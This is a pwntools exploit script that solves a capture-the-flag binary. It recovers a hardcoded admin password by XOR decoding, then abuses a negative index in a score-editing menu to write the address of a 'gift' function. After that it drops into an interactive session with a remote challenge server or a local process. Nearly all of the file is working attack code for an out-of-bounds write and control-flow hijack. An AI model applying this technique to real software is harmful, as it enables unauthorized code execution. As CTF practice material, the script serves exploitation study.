#!/usr/bin/env python3

from pwn import *

exe = ELF('chal', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = [
    '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', 
    '0', 'split-pane','-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c'
]

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x00000000004014e4
        b*0x0000000000401446
        x/-50xg &player_scores
        
        c
        ''')
        input()

if args.REMOTE:
    p = remote('23.146.248.136',31480)
else:
    p = process([exe.path])
GDB()

secret = bytearray(21)
secret[0:8]  = (0xCED89ADDD9D9EAFA).to_bytes(8,'little')
secret[8:16] = (0xDB929FC298CF92F5).to_bytes(8,'little')
secret[13:21]= (0x9FDBDE93DEDB929F).to_bytes(8,'little')

password = bytes(b ^ 0xAA for b in secret)

info("password: " + str(password))

sla(b'username: ', b'admin')
sla(b'password: ', password)

slna(b': ', 2)

slna(b'edit? ', -2)
sla(b'name: ', p64(exe.sym.gift))
slna(b'score: ', 4199067)
slna(b': ', 3)


p.interactive()
